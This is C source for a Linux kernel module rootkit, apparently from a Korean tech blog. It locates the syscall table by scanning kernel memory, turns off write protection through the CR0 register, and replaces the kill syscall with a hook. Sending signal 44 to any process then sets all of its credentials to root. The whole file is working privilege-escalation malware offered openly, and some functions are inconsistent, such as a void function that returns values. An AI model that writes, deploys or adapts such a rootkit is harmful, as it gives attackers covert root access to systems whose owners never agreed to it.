#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/unistd.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>


MODULE_LICENSE("GPL"); // GPL == GNU Public License v2 또는 이상
// GPL과 호환되는 라이선스로 등록한 모듈에서만 해당 심볼들을 사용가능.
MODULE_AUTHOR("Richong");
MODULE_DESCRIPTION("richong.tistory.com");


//x86 system
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else //x64 system
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

//global var

asmlinkage int (*org_kill)(pid_t pid, int sig);
psize* psys_table = NULL;
///////////////////////////////////////////////////////////////////////////////


//function define
int rootkit_init(void);
void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);
void write_on(void);
void write_off(void);
asmlinkage int my_kill(pid_t pid, int sig);
asmlinkage void get_root(pid_t pid);


void write_off(void){
	write_cr0(read_cr0() & (~0x10000));
}

void write_on(void){
	write_cr0(read_cr0() | (0x10000));
}


enum {
	SIGTEST = 44,
};





asmlinkage int my_kill(pid_t pid, int sig){

	int ret = 0;
	printk("kill pid : %d sig : %d\n",pid,sig);

	switch(sig){
		case SIGTEST:
			get_root(pid);
			printk("Hello world\n");
			break;
		default:
			ret = org_kill(pid,sig);
			break;
	}
	return ret;
}


asmlinkage void get_root(pid_t pid)
{

   struct user_namespace *ns = current_user_ns();
   struct cred *new;



   kuid_t kuid = make_kuid(ns, 0);
   kgid_t kgid = make_kgid(ns, 0);

  // if(!uid_valid(kuid)) {
  //    return -EINVAL;
  // }

   new =  prepare_creds();

   if(new != NULL) {

    new->uid.val = 0;
      new->gid.val = 0;
      new->euid.val = 0;
      new->egid.val = 0;
      new->suid.val = 0;
      new->sgid.val = 0;
      new->fsuid.val = 0;
      new->fsgid.val = 0;
      return commit_creds(new);
   } else {
      abort_creds(new);
      return -ENOMEM;
   }
}

psize find_syscall_table(void)
{
	psize** ppsyscall_table = NULL;
	psize index = START_CHECK;
	//kernel memory searching
	while (index < END_CHECK){
		ppsyscall_table = (psize**)index;
		
		//ppsyscall_table __NR_close index value get
		//cmp true sys_close value
		if(ppsyscall_table[__NR_close] == (psize*) sys_close){
			return &ppsyscall_table[0];
		}
	
		//4byte ++
		index += sizeof(void*);
	}
	
	return 0;
}



int rootkit_init(void) {


 printk("rootkit: module loaded\n");
 //find syscall table
 psys_table = find_syscall_table();

 if(psys_table){
	printk("system call table address : %p\n",psys_table);
 }
 else{
	printk("Not find syscall table address \n");
 }

 //write protect off
 write_off();
 
 //syscall table change
 //org_write backup origin address data
 org_kill = (void*) xchg(&psys_table[__NR_kill], my_kill);

  //write protect on
 write_on();

 return 0;
}





void rootkit_exit(void) {
 printk("rootkit: module removed\n");

 write_off();
 xchg(&psys_table[__NR_kill],org_kill);
 write_on();
}
